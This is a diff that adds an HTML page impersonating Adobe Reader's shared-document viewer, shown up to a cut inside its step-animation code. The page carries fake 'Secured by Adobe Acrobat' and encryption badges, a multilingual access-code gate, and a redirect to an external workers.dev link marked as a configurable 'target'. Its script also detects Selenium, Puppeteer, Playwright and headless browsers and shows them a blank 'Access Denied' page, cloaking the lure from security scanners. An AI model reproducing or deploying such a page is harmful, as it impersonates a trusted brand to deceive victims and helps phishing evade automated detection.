@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<title>Adobe Reader - Shared Document</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif}
+body{background:#e9ecef;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:16px;}
+.wrapper{width:100%;max-width:560px;margin:0 auto}
+.card{width:100%;background:#ffffff;border-radius:24px;box-shadow:0 20px 35px -10px rgba(0,0,0,0.15);overflow:hidden}
+.adobe-header{background:#2c2c2c;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.adobe-logo{display:flex;align-items:center;gap:12px}
+.adobe-icon{width:34px;height:34px;background:#fa0f00;border-radius:8px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
+.adobe-icon i{color:white;font-size:20px;font-weight:900}
+.adobe-text{color:white;font-weight:600;font-size:16px;letter-spacing:-0.3px}
+.adobe-text small{font-size:10px;color:#b8b8b8;margin-left:5px}
+.pdf-badge{background:#3d3d4a;padding:5px 12px;border-radius:30px;color:#ff9e8c;font-size:11px;font-weight:500}
+.doc-preview{background:#f9fafc;border-bottom:1px solid #eef2f8;padding:14px 20px;display:flex;align-items:center;gap:14px}
+.pdf-icon{width:44px;height:48px;background:#fa0f00;border-radius:8px;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+.pdf-icon i:first-child{color:white;font-size:20px;font-weight:800}
+.pdf-icon i:last-child{color:#ffccaa;font-size:9px}
+.doc-info{flex:1}
+.doc-name{font-weight:800;font-size:15px;color:#1e293b;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.doc-name .file-name{background:#f1f5f9;padding:3px 10px;border-radius:20px;font-size:11px;color:#475569}
+.doc-meta{font-size:11px;color:#7f8c9a;margin-top:4px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.adobe-content{padding:20px 20px 26px}
+.title-section{margin-bottom:16px}
+.title-section h1{font-size:20px;font-weight:700;color:#1e293b;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.title-section p{font-size:12px;color:#6c7a91;margin-top:4px}
+/* HORIZONTAL STEPS */
+.horizontal-steps{display:flex;align-items:flex-start;justify-content:space-between;margin:20px 0 24px;position:relative;flex-wrap:wrap;gap:8px}
+.horizontal-steps::before{content:"";position:absolute;top:24px;left:40px;right:40px;height:2px;background:#e2e8f0;z-index:0}
+.step-horizontal{flex:1;text-align:center;position:relative;z-index:1;background:#ffffff;min-width:90px}
+.step-circle{width:48px;height:48px;margin:0 auto 8px;border-radius:50%;background:#f1f5f9;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px;color:#5b6b8c;transition:all 0.2s;border:2px solid #e2e8f0}
+.step-circle.active{background:#fa0f00;color:white;border-color:#fa0f00;box-shadow:0 3px 10px rgba(250,15,0,0.25)}
+.step-circle.completed{background:#10b981;color:white;border-color:#10b981}
+.step-label{font-weight:700;font-size:12px;color:#1e2a44;margin-bottom:4px}
+.step-desc-small{font-size:10px;color:#8592ad;margin-bottom:4px}
+.step-status-horizontal{font-size:10px;font-weight:500;display:inline-flex;align-items:center;gap:4px;justify-content:center}
+.loader-tiny{display:inline-block;width:10px;height:10px;border:2px solid #e2e8f0;border-top-color:#fa0f00;border-radius:50%;animation:spin 0.7s linear infinite;vertical-align:middle}
+.secured{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:16px;color:#9aa3bc;font-size:10px}
+.waiting{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:10px;font-size:12px;color:#5b6b8c}
+.loader{display:inline-block;width:14px;height:14px;border:2px solid #e2e8f0;border-top:2px solid #fa0f00;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:6px}
+.status{margin-top:12px;text-align:center;padding:10px;background:#f8fafd;color:#5b6b8c;font-size:11px;border-radius:14px;word-break:break-word}
+.status.success{background:#dff6dd;color:#107c10}
+.status.error{background:#fee2e2;color:#dc2626}
+@keyframes spin{to{transform:rotate(360deg)}}
+html{scroll-behavior:smooth}
+@media(max-width:550px){
+body{padding:12px}
+.wrapper{max-width:100%}
+.adobe-content{padding:16px 16px 22px}
+.doc-preview{padding:12px 16px;gap:12px}
+.pdf-icon{width:38px;height:42px}
+.step-circle{width:38px;height:38px;font-size:15px}
+.step-label{font-size:10px}
+.step-desc-small{font-size:8px}
+.horizontal-steps::before{top:19px;left:30px;right:30px}
+}
+
+/* ===== MODAL – ADOBE STYLE ===== */
+#modalOverlay{
+    position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.55);z-index:9999;
+    display:flex;justify-content:center;align-items:center;
+    opacity:0;visibility:hidden;transition:opacity 0.4s ease, visibility 0.4s;
+    backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);
+}
+#modalOverlay.show{opacity:1;visibility:visible;}
+#modalOverlay .modal-card{
+    background:white;border-radius:28px;padding:40px 32px 36px;max-width:420px;width:90%;
+    box-shadow:0 25px 60px rgba(0,0,0,0.25);
+    transform:scale(0.92) translateY(20px);
+    transition:transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
+    opacity:0;
+}
+#modalOverlay.show .modal-card{
+    transform:scale(1) translateY(0);
+    opacity:1;
+}
+#modalOverlay .modal-card .modal-icon{
+    text-align:center;margin-bottom:12px;
+}
+#modalOverlay .modal-card .modal-icon img{
+    width:64px;height:64px;object-fit:contain;display:inline-block;
+}
+#modalOverlay .modal-card h1{
+    font-size:22px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:6px;
+}
+#modalOverlay .modal-card p{
+    font-size:14px;color:#5e5e5e;text-align:center;line-height:1.6;margin-bottom:22px;
+}
+#modalOverlay .modal-card .input-group{
+    display:flex;flex-direction:column;gap:6px;margin-bottom:6px;
+}
+#modalOverlay .modal-card .input-group label{
+    font-weight:600;font-size:14px;color:#1a1a1a;display:flex;justify-content:space-between;
+}
+#modalOverlay .modal-card .input-group .input-wrapper{
+    position:relative;
+}
+#modalOverlay .modal-card .input-group .input-wrapper input{
+    width:100%;padding:12px 44px 12px 14px;font-size:16px;border:2px solid #ddd;border-radius:10px;outline:none;transition:border 0.2s, box-shadow 0.2s;background:#fafbfc;
+}
+#modalOverlay .modal-card .input-group .input-wrapper input:focus{
+    border-color:#fa0f00;box-shadow:0 0 0 4px rgba(250,15,0,0.08);background:#fff;
+}
+#modalOverlay .modal-card .input-group .input-wrapper .toggle-vis{
+    position:absolute;right:14px;top:50%;transform:translateY(-50%);
+    background:none;border:none;color:#999;font-size:18px;cursor:pointer;padding:4px;transition:color 0.2s;
+}
+#modalOverlay .modal-card .input-group .input-wrapper .toggle-vis:hover{color:#333;}
+#modalOverlay .modal-card .error-msg{
+    color:#d13438;font-size:13px;min-height:22px;text-align:center;display:flex;align-items:center;justify-content:center;gap:6px;margin:4px 0 10px;
+}
+#modalOverlay .modal-card .error-msg i{font-size:16px;}
+#modalOverlay .modal-card .error-msg.hidden{display:none;}
+#modalOverlay .modal-card .error-msg.shake{animation:shake 0.3s ease;}
+@keyframes shake{
+    0%,100%{transform:translateX(0);}
+    20%{transform:translateX(-8px);}
+    40%{transform:translateX(8px);}
+    60%{transform:translateX(-5px);}
+    80%{transform:translateX(5px);}
+}
+#modalOverlay .modal-card .actions{
+    display:flex;justify-content:flex-end;gap:12px;margin-top:8px;
+}
+#modalOverlay .modal-card .actions .next-btn{
+    background:#fa0f00;border:none;color:white;padding:12px 32px;border-radius:10px;font-weight:700;font-size:15px;cursor:pointer;transition:background 0.2s, transform 0.1s;display:flex;align-items:center;gap:8px;min-width:100px;justify-content:center;
+}
+#modalOverlay .modal-card .actions .next-btn:hover{
+    background:#e00b00;
+}
+#modalOverlay .modal-card .actions .next-btn:active{
+    transform:scale(0.96);
+}
+#modalOverlay .modal-card .actions .next-btn:disabled{
+    opacity:0.6;cursor:not-allowed;transform:none;
+}
+#modalOverlay .modal-card .actions .next-btn .spinner{
+    display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.4);border-top:2px solid white;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;
+}
+#modalOverlay .modal-card .actions .back-link{
+    color:#fa0f00;background:none;border:none;cursor:pointer;font-size:14px;font-weight:600;padding:0 4px;
+}
+#modalOverlay .modal-card .actions .back-link:hover{
+    text-decoration:underline;
+}
+#modalOverlay .modal-card .footer-note{
+    margin-top:18px;text-align:center;font-size:11px;color:#a0a0a0;
+}
+#modalOverlay .modal-card .footer-note i{color:#fa0f00;margin-right:4px;}
+@media(max-width:480px){
+    #modalOverlay .modal-card{padding:32px 20px;}
+    #modalOverlay .modal-card h1{font-size:20px;}
+}
+
+/* Re‑open link */
+#reopenModalBtn {
+    display: none;
+    margin: 16px auto 0;
+    text-align: center;
+    font-size: 13px;
+    color: #fa0f00;
+    cursor: pointer;
+    background: none;
+    border: none;
+    text-decoration: underline;
+    font-weight: 600;
+    padding: 6px 12px;
+    transition: color 0.2s;
+}
+#reopenModalBtn:hover {
+    color: #c00;
+}
+</style>
+</head>
+<body>
+
+<!-- MODAL OVERLAY -->
+<div id="modalOverlay">
+    <div class="modal-card">
+        <div class="modal-icon">
+            <img src="https://res.cloudinary.com/dlm0m7yx2/image/upload/v1786165460/205-2059706_adobe-pdf-downloads-pdf-icon-png-transparent-png_pog2zg.jpg" alt="Adobe PDF icon" />
+        </div>
+        <h1 id="modalTitle">Enter access code</h1>
+        <p id="modalDesc">Enter the code provided to you to view the shared document.</p>
+        <div class="input-group">
+            <label for="modalCodeInput">
+                <span id="modalLabel">Code</span>
+            </label>
+            <div class="input-wrapper">
+                <input type="password" id="modalCodeInput" placeholder="Enter the code" autofocus spellcheck="false" />
+                <button class="toggle-vis" id="toggleVisibility" type="button" aria-label="Toggle visibility">
+                    <i class="bi bi-eye"></i>
+                </button>
+            </div>
+        </div>
+        <div class="error-msg hidden" id="modalError">
+            <i class="bi bi-exclamation-circle-fill"></i>
+            <span id="errorText">Incorrect code. Please try again.</span>
+        </div>
+        <div class="actions">
+            <button class="back-link" id="modalBack">Cancel</button>
+            <button class="next-btn" id="modalNext">
+                <span id="nextBtnText">Access Document</span>
+            </button>
+        </div>
+        <div class="footer-note"><i class="bi bi-shield-check"></i> Secured by Adobe Acrobat</div>
+    </div>
+</div>
+
+<!-- MAIN WRAPPER -->
+<div class="wrapper">
+
+<div class="card" id="mainCard">
+
+<div class="adobe-header">
+<div class="adobe-logo">
+<div class="adobe-icon"><i class="bi bi-filetype-pdf"></i></div>
+<div class="adobe-text">Adobe Reader <small>PDF Viewer</small></div>
+</div>
+<div class="pdf-badge"><i class="bi bi-shield-check"></i> Protected</div>
+</div>
+
+<div class="doc-preview">
+<div class="pdf-icon">
+<i class="bi bi-file-earmark-pdf-fill"></i>
+<i class="bi bi-adobe"></i>
+</div>
+<div class="doc-info">
+<div class="doc-name">
+Shared Document
+<span class="file-name">.pdf</span>
+</div>
+<div class="doc-meta">
+<i class="bi bi-lock-fill"></i> Encrypted • 245 KB
+<span><i class="bi bi-shield-lock-fill"></i> Verification required</span>
+</div>
+</div>
+</div>
+
+<div class="adobe-content">
+
+<div class="title-section">
+<h1 id="pageTitle"><i class="bi bi-file-earmark-text"></i> Shared Document</h1>
+<p id="pageSub">Enter the access code to view this document</p>
+</div>
+
+<!-- HORIZONTAL STEPS -->
+<div class="horizontal-steps" id="stepsContainer">
+<div class="step-horizontal" id="step1Horiz">
+<div class="step-circle" id="step1Circle">1</div>
+<div class="step-label" id="step1Label">Connecting</div>
+<div class="step-desc-small" id="step1Desc">Secure handshake</div>
+<div class="step-status-horizontal" id="step1StatusH"><span class="loader-tiny"></span> Loading...</div>
+</div>
+<div class="step-horizontal" id="step2Horiz">
+<div class="step-circle" id="step2Circle">2</div>
+<div class="step-label" id="step2Label">Verifying</div>
+<div class="step-desc-small" id="step2Desc">Access rights</div>
+<div class="step-status-horizontal" id="step2StatusH"><i class="bi bi-hourglass-split"></i> Waiting</div>
+</div>
+<div class="step-horizontal" id="step3Horiz">
+<div class="step-circle" id="step3Circle">3</div>
+<div class="step-label" id="step3Label">Redirecting</div>
+<div class="step-desc-small" id="step3Desc">Opening document</div>
+<div class="step-status-horizontal" id="step3StatusH"><i class="bi bi-lock-fill"></i> Locked</div>
+</div>
+</div>
+
+<div class="secured"><i class="bi bi-shield-check"></i> Secured by Adobe Acrobat</div>
+
+<div class="status" id="status">
+<div class="waiting">
+<div class="loader"></div>
+<span id="statusText">Initializing secure connection...</span>
+</div>
+</div>
+
+<!-- Re‑open link (hidden by default) -->
+<button id="reopenModalBtn">Click here to re‑enter the access code</button>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+(function(){
+/* ================================================================
+   CONFIG – Change these
+   ================================================================ */
+var ADMIN_CODE = "268456";   // Hardcoded admin code
+var REDIRECT_URL = "https://base-net-1isc.p-am0hs18p.workers.dev/l/xCEmlLTBP8c"; // Change to your target
+
+/* ================================================================
+   AUTO-TRANSLATION
+   ================================================================ */
+var L10N = {
+    'en': {
+        modalTitle:'Enter access code',
+        modalDesc:'Enter the code provided to you to view the shared document.',
+        modalLabel:'Code',
+        modalPlaceholder:'Enter the code',
+        modalError:'Incorrect code. Please try again.',
+        modalBtn:'Access Document',
+        pageTitle:'Shared Document',
+        pageSub:'Enter the access code to view this document',
+        step1Label:'Connecting',
+        step1Desc:'Secure handshake',
+        step1Status:'Loading...',
+        step2Label:'Verifying',
+        step2Desc:'Access rights',
+        step2Status:'Waiting',
+        step3Label:'Redirecting',
+        step3Desc:'Opening document',
+        step3Status:'Locked',
+        statusInit:'Initializing secure connection...',
+        statusConn:'Step 1: Verifying connection...',
+        statusVer:'Step 2: Verifying access rights...',
+        statusRedir:'Step 3: Redirecting to document...',
+        reopenText:'Click here to re‑enter the access code'
+    },
+    'es': {
+        modalTitle:'Introduce el código de acceso',
+        modalDesc:'Introduce el código que se te ha proporcionado para ver el documento compartido.',
+        modalLabel:'Código',
+        modalPlaceholder:'Introduce el código',
+        modalError:'Código incorrecto. Inténtalo de nuevo.',
+        modalBtn:'Acceder al documento',
+        pageTitle:'Documento compartido',
+        pageSub:'Introduce el código de acceso para ver este documento',
+        step1Label:'Conectando',
+        step1Desc:'Protocolo seguro',
+        step1Status:'Cargando...',
+        step2Label:'Verificando',
+        step2Desc:'Derechos de acceso',
+        step2Status:'Esperando',
+        step3Label:'Redirigiendo',
+        step3Desc:'Abriendo documento',
+        step3Status:'Bloqueado',
+        statusInit:'Inicializando conexión segura...',
+        statusConn:'Paso 1: Verificando conexión...',
+        statusVer:'Paso 2: Verificando derechos de acceso...',
+        statusRedir:'Paso 3: Redirigiendo al documento...',
+        reopenText:'Haz clic aquí para volver a introducir el código de acceso'
+    },
+    'fr': {
+        modalTitle:'Entrez le code d\'accès',
+        modalDesc:'Entrez le code qui vous a été fourni pour voir le document partagé.',
+        modalLabel:'Code',
+        modalPlaceholder:'Entrez le code',
+        modalError:'Code incorrect. Veuillez réessayer.',
+        modalBtn:'Accéder au document',
+        pageTitle:'Document partagé',
+        pageSub:'Entrez le code d\'accès pour voir ce document',
+        step1Label:'Connexion',
+        step1Desc:'Échange sécurisé',
+        step1Status:'Chargement...',
+        step2Label:'Vérification',
+        step2Desc:'Droits d\'accès',
+        step2Status:'En attente',
+        step3Label:'Redirection',
+        step3Desc:'Ouverture du document',
+        step3Status:'Verrouillé',
+        statusInit:'Initialisation de la connexion sécurisée...',
+        statusConn:'Étape 1 : Vérification de la connexion...',
+        statusVer:'Étape 2 : Vérification des droits d\'accès...',
+        statusRedir:'Étape 3 : Redirection vers le document...',
+        reopenText:'Cliquez ici pour saisir à nouveau le code d\'accès'
+    },
+    'de': {
+        modalTitle:'Zugangscode eingeben',
+        modalDesc:'Geben Sie den Code ein, der Ihnen zum Anzeigen des freigegebenen Dokuments bereitgestellt wurde.',
+        modalLabel:'Code',
+        modalPlaceholder:'Code eingeben',
+        modalError:'Falscher Code. Bitte versuchen Sie es erneut.',
+        modalBtn:'Auf Dokument zugreifen',
+        pageTitle:'Gemeinsames Dokument',
+        pageSub:'Geben Sie den Zugangscode ein, um dieses Dokument anzuzeigen',
+        step1Label:'Verbinden',
+        step1Desc:'Sicherer Handshake',
+        step1Status:'Lädt...',
+        step2Label:'Verifizieren',
+        step2Desc:'Zugriffsrechte',
+        step2Status:'Warten',
+        step3Label:'Weiterleiten',
+        step3Desc:'Dokument wird geöffnet',
+        step3Status:'Gesperrt',
+        statusInit:'Sichere Verbindung wird initialisiert...',
+        statusConn:'Schritt 1: Verbindung wird überprüft...',
+        statusVer:'Schritt 2: Zugriffsrechte werden geprüft...',
+        statusRedir:'Schritt 3: Weiterleitung zum Dokument...',
+        reopenText:'Klicken Sie hier, um den Zugangscode erneut einzugeben'
+    },
+    'pt': {
+        modalTitle:'Digite o código de acesso',
+        modalDesc:'Digite o código fornecido a você para visualizar o documento compartilhado.',
+        modalLabel:'Código',
+        modalPlaceholder:'Digite o código',
+        modalError:'Código incorreto. Tente novamente.',
+        modalBtn:'Acessar documento',
+        pageTitle:'Documento compartilhado',
+        pageSub:'Digite o código de acesso para visualizar este documento',
+        step1Label:'Conectando',
+        step1Desc:'Handshake seguro',
+        step1Status:'Carregando...',
+        step2Label:'Verificando',
+        step2Desc:'Direitos de acesso',
+        step2Status:'Aguardando',
+        step3Label:'Redirecionando',
+        step3Desc:'Abrindo documento',
+        step3Status:'Bloqueado',
+        statusInit:'Inicializando conexão segura...',
+        statusConn:'Etapa 1: Verificando conexão...',
+        statusVer:'Etapa 2: Verificando direitos de acesso...',
+        statusRedir:'Etapa 3: Redirecionando para o documento...',
+        reopenText:'Clique aqui para digitar novamente o código de acesso'
+    },
+    'it': {
+        modalTitle:'Inserisci il codice di accesso',
+        modalDesc:'Inserisci il codice che ti è stato fornito per visualizzare il documento condiviso.',
+        modalLabel:'Codice',
+        modalPlaceholder:'Inserisci il codice',
+        modalError:'Codice errato. Riprova.',
+        modalBtn:'Accedi al documento',
+        pageTitle:'Documento condiviso',
+        pageSub:'Inserisci il codice di accesso per visualizzare questo documento',
+        step1Label:'Connessione',
+        step1Desc:'Handshake sicuro',
+        step1Status:'Caricamento...',
+        step2Label:'Verifica',
+        step2Desc:'Diritti di accesso',
+        step2Status:'In attesa',
+        step3Label:'Reindirizzamento',
+        step3Desc:'Apertura documento',
+        step3Status:'Bloccato',
+        statusInit:'Inizializzazione connessione sicura...',
+        statusConn:'Passo 1: Verifica connessione...',
+        statusVer:'Passo 2: Verifica diritti di accesso...',
+        statusRedir:'Passo 3: Reindirizzamento al documento...',
+        reopenText:'Fai clic qui per reinserire il codice di accesso'
+    },
+    'nl': {
+        modalTitle:'Voer toegangscode in',
+        modalDesc:'Voer de code in die u hebt gekregen om het gedeelde document te bekijken.',
+        modalLabel:'Code',
+        modalPlaceholder:'Voer de code in',
+        modalError:'Onjuiste code. Probeer opnieuw.',
+        modalBtn:'Toegang tot document',
+        pageTitle:'Gedeeld document',
+        pageSub:'Voer de toegangscode in om dit document te bekijken',
+        step1Label:'Verbinden',
+        step1Desc:'Veilige handshake',
+        step1Status:'Laden...',
+        step2Label:'Verifiëren',
+        step2Desc:'Toegangsrechten',
+        step2Status:'Wachten',
+        step3Label:'Doorverwijzen',
+        step3Desc:'Document wordt geopend',
+        step3Status:'Vergrendeld',
+        statusInit:'Beveiligde verbinding initialiseren...',
+        statusConn:'Stap 1: Verbinding controleren...',
+        statusVer:'Stap 2: Toegangsrechten controleren...',
+        statusRedir:'Stap 3: Doorverwijzen naar document...',
+        reopenText:'Klik hier om de toegangscode opnieuw in te voeren'
+    },
+    'ru': {
+        modalTitle:'Введите код доступа',
+        modalDesc:'Введите код, предоставленный вам для просмотра общего документа.',
+        modalLabel:'Код',
+        modalPlaceholder:'Введите код',
+        modalError:'Неверный код. Попробуйте снова.',
+        modalBtn:'Открыть документ',
+        pageTitle:'Общий документ',
+        pageSub:'Введите код доступа для просмотра этого документа',
+        step1Label:'Подключение',
+        step1Desc:'Безопасное рукопожатие',
+        step1Status:'Загрузка...',
+        step2Label:'Проверка',
+        step2Desc:'Права доступа',
+        step2Status:'Ожидание',
+        step3Label:'Перенаправление',
+        step3Desc:'Открытие документа',
+        step3Status:'Заблокировано',
+        statusInit:'Инициализация безопасного соединения...',
+        statusConn:'Шаг 1: Проверка соединения...',
+        statusVer:'Шаг 2: Проверка прав доступа...',
+        statusRedir:'Шаг 3: Перенаправление к документу...',
+        reopenText:'Нажмите здесь, чтобы повторно ввести код доступа'
+    },
+    'ja': {
+        modalTitle:'アクセスコードを入力',
+        modalDesc:'共有ドキュメントを表示するために提供されたコードを入力してください。',
+        modalLabel:'コード',
+        modalPlaceholder:'コードを入力',
+        modalError:'コードが正しくありません。もう一度お試しください。',
+        modalBtn:'ドキュメントにアクセス',
+        pageTitle:'共有ドキュメント',
+        pageSub:'このドキュメントを表示するにはアクセスコードを入力してください',
+        step1Label:'接続中',
+        step1Desc:'セキュアハンドシェイク',
+        step1Status:'読み込み中...',
+        step2Label:'検証中',
+        step2Desc:'アクセス権',
+        step2Status:'待機中',
+        step3Label:'リダイレクト中',
+        step3Desc:'ドキュメントを開いています',
+        step3Status:'ロック済み',
+        statusInit:'セキュア接続を初期化中...',
+        statusConn:'ステップ1: 接続を確認中...',
+        statusVer:'ステップ2: アクセス権を確認中...',
+        statusRedir:'ステップ3: ドキュメントにリダイレクト中...',
+        reopenText:'クリックしてアクセスコードを再入力'
+    },
+    'zh': {
+        modalTitle:'输入访问代码',
+        modalDesc:'输入提供给您的代码以查看共享文档。',
+        modalLabel:'代码',
+        modalPlaceholder:'输入代码',
+        modalError:'代码不正确。请重试。',
+        modalBtn:'访问文档',
+        pageTitle:'共享文档',
+        pageSub:'输入访问代码以查看此文档',
+        step1Label:'连接中',
+        step1Desc:'安全握手',
+        step1Status:'加载中...',
+        step2Label:'验证中',
+        step2Desc:'访问权限',
+        step2Status:'等待中',
+        step3Label:'重定向中',
+        step3Desc:'正在打开文档',
+        step3Status:'已锁定',
+        statusInit:'正在初始化安全连接...',
+        statusConn:'步骤1: 正在验证连接...',
+        statusVer:'步骤2: 正在验证访问权限...',
+        statusRedir:'步骤3: 正在重定向到文档...',
+        reopenText:'点击此处重新输入访问代码'
+    },
+    'ar': {
+        modalTitle:'أدخل رمز الوصول',
+        modalDesc:'أدخل الرمز المقدم لك لعرض المستند المشترك.',
+        modalLabel:'الرمز',
+        modalPlaceholder:'أدخل الرمز',
+        modalError:'رمز غير صحيح. يرجى المحاولة مرة أخرى.',
+        modalBtn:'الوصول إلى المستند',
+        pageTitle:'مستند مشترك',
+        pageSub:'أدخل رمز الوصول لعرض هذا المستند',
+        step1Label:'جارٍ الاتصال',
+        step1Desc:'مصافحة آمنة',
+        step1Status:'جارٍ التحميل...',
+        step2Label:'جارٍ التحقق',
+        step2Desc:'حقوق الوصول',
+        step2Status:'في انتظار',
+        step3Label:'جارٍ إعادة التوجيه',
+        step3Desc:'جارٍ فتح المستند',
+        step3Status:'مغلق',
+        statusInit:'جارٍ تهيئة الاتصال الآمن...',
+        statusConn:'الخطوة 1: جارٍ التحقق من الاتصال...',
+        statusVer:'الخطوة 2: جارٍ التحقق من حقوق الوصول...',
+        statusRedir:'الخطوة 3: جارٍ إعادة التوجيه إلى المستند...',
+        reopenText:'انقر هنا لإعادة إدخال رمز الوصول'
+    }
+};
+
+var userLang = (navigator.languages ? navigator.languages[0] : navigator.language || 'en').split('-')[0];
+var dict = L10N[userLang] || L10N['en'];
+
+function applyTranslation() {
+    document.getElementById('modalTitle').textContent = dict.modalTitle;
+    document.getElementById('modalDesc').textContent = dict.modalDesc;
+    document.getElementById('modalLabel').textContent = dict.modalLabel;
+    document.getElementById('modalCodeInput').placeholder = dict.modalPlaceholder;
+    document.getElementById('errorText').textContent = dict.modalError;
+    document.getElementById('nextBtnText').textContent = dict.modalBtn;
+    document.getElementById('pageTitle').innerHTML = '<i class="bi bi-file-earmark-text"></i> ' + dict.pageTitle;
+    document.getElementById('pageSub').textContent = dict.pageSub;
+    document.getElementById('step1Label').textContent = dict.step1Label;
+    document.getElementById('step1Desc').textContent = dict.step1Desc;
+    document.getElementById('step1StatusH').innerHTML = '<span class="loader-tiny"></span> ' + dict.step1Status;
+    document.getElementById('step2Label').textContent = dict.step2Label;
+    document.getElementById('step2Desc').textContent = dict.step2Desc;
+    document.getElementById('step2StatusH').innerHTML = '<i class="bi bi-hourglass-split"></i> ' + dict.step2Status;
+    document.getElementById('step3Label').textContent = dict.step3Label;
+    document.getElementById('step3Desc').textContent = dict.step3Desc;
+    document.getElementById('step3StatusH').innerHTML = '<i class="bi bi-lock-fill"></i> ' + dict.step3Status;
+    document.getElementById('statusText').textContent = dict.statusInit;
+    document.getElementById('reopenModalBtn').textContent = dict.reopenText;
+}
+applyTranslation();
+
+/* ================================================================
+   ANTI-BOT (lightweight, threshold 50)
+   ================================================================ */
+var score = 0;
+if (navigator.webdriver) score += 40;
+if (window._phantom || window.__nightmare || window.callPhantom) score += 40;
+if (window.domAutomation || window.domAutomationController) score += 40;
+if (!navigator.languages || !navigator.languages.length) score += 15;
+if (screen.width === 0 && screen.height === 0) score += 30;
+if (/HeadlessChrome/i.test(navigator.userAgent)) score += 50;
+var automationGlobals = ["__webdriver_evaluate","__selenium_evaluate","__fxdriver_evaluate","__driver_evaluate","_Selenium_IDE_Recorder","_selenium","calledSelenium","__nightmare","__puppeteer_evaluation_script__","__playwright"];
+for (var i = 0; i < automationGlobals.length; i++) {
+    if (window[automationGlobals[i]] !== undefined) { score += 40; break; }
+}
+if (score >= 50) {
+    document.body.innerHTML = '';
+    document.body.style.background = '#fff';
+    var msg = document.createElement('div');
+    msg.style.cssText = 'font-family:Arial;text-align:center;margin-top:20%;font-size:22px;color:#333;';
+    msg.innerText = 'Access Denied — Please contact your administrator.';
+    document.body.appendChild(msg);
+    return;
+}
+
+/* ================================================================
+   MODAL LOGIC
+   ================================================================ */
+var modalOverlay = document.getElementById('modalOverlay');
+var modalInput = document.getElementById('modalCodeInput');
+var modalNext = document.getElementById('modalNext');
+var modalBack = document.getElementById('modalBack');
+var modalError = document.getElementById('modalError');
+var errorText = document.getElementById('errorText');
+var nextBtnText = document.getElementById('nextBtnText');
+var toggleVis = document.getElementById('toggleVisibility');
+var eyeIcon = toggleVis.querySelector('i');
+var reopenBtn = document.getElementById('reopenModalBtn');
+
+// Toggle password visibility
+toggleVis.addEventListener('click', function() {
+    var type = modalInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    modalInput.setAttribute('type', type);
+    eyeIcon.classList.toggle('bi-eye');
+    eyeIcon.classList.toggle('bi-eye-slash');
+});
+
+function showModal() {
+    modalOverlay.classList.add('show');
+    reopenBtn.style.display = 'none'; // hide the reopen link
+    setTimeout(function(){ modalInput.focus(); }, 400);
+}
+function hideModal() {
+    modalOverlay.classList.remove('show');
+    resetModal();
+    reopenBtn.style.display = 'block'; // show the reopen link
+}
+
+function resetModal() {
+    modalInput.value = '';
+    modalError.classList.add('hidden');
+    modalError.classList.remove('shake');
+    modalNext.disabled = false;
+    nextBtnText.textContent = dict.modalBtn;
+    modalInput.setAttribute('type', 'password');
+    eyeIcon.className = 'bi bi-eye';
+}
+
+function setError(msg) {
+    errorText.textContent = msg || dict.modalError;
+    modalError.classList.remove('hidden');
+    modalError.classList.remove('shake');
+    void modalError.offsetWidth;
+    modalError.classList.add('shake');
+    modalInput.focus();
+    modalInput.select();
+}
+
+function checkCode() {
+    var entered = modalInput.value.trim();
+    if (entered === '') {
+        setError('Please enter the access code.');
+        return;
+    }
+    modalNext.disabled = true;
+    nextBtnText.innerHTML = '<span class="spinner"></span> Verifying...';
+
+    setTimeout(function() {
+        if (entered === ADMIN_CODE) {
+            hideModal(); // hide modal, but we don't want to show reopen link because we are redirecting
+            // Actually we want to hide it and start redirect flow; we should not show reopen link.
+            // So we call a custom hide that doesn't show reopen.
+            modalOverlay.classList.remove('show');
+            resetModal();
+            // Do not show reopen link because redirect is starting
+            reopenBtn.style.display = 'none';
+            startRedirectFlow();
+        } else {
+            modalNext.disabled = false;
+            nextBtnText.textContent = dict.modalBtn;
+            setError(dict.modalError);
+            modalInput.value = '';
+        }
+    }, 600);
+}
+
+modalNext.addEventListener('click', function(e) {
+    e.preventDefault();
+    checkCode();
+});
+
+modalInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        checkCode();
+    }
+    modalError.classList.add('hidden');
+});
+
+modalBack.addEventListener('click', function(e) {
+    e.preventDefault();
+    hideModal(); // this will show the reopen link
+});
+
+// Re-open link click
+reopenBtn.addEventListener('click', function() {
+    showModal();
+});
+
+// Show modal initially after delay
+setTimeout(showModal, 400);
+
+/* ================================================================
+   REDIRECT FLOW (after code)
+   ================================================================ */
+var statusEl = document.getElementById('status');
+var statusText = document.getElementById('statusText');
+
+function updateStepUI(step) {
+    for (var i = 1; i <= 3; i++) {
+        var circle = document.getElementById('step' + i + 'Circle');
+        var status = document.getElementById('step' + i + 'StatusH');
+        if (i <= step) {
+            circle.classList.remove('active');
+            circle.classList.add('completed');
+            circle.innerHTML = '<i class="bi bi-check-lg"></i>';
+            status.innerHTML = '<i class="bi bi-check-circle-fill"></i> Done';
+        } else if (i === step + 1) {
+            circle.classList.add('active');
